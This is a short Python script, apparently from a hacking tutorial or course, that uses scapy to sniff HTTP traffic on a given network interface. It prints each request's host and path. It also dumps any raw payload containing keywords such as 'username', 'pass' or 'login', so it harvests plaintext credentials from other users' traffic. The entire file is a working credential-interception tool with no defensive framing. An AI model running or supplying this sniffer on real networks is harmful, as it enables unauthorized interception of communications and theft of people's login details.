import scapy.all as scapy
from scapy.layers import http
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', help='Interface to sniff', dest='interface')
    args = vars(parser.parse_args())
    return args


def sniff(interface):
    scapy.sniff(store=False, iface=interface, prn=process_sniffed_packets)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        lst = ['uname', 'username', 'pass', 'password', 'login']
        for i in lst:
            if i in load:
                return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('HTTP Request: ', url)
        login_info = get_login_info(packet)
        if login_info:
            print(login_info)


args = get_args()
sniff(args['interface'])
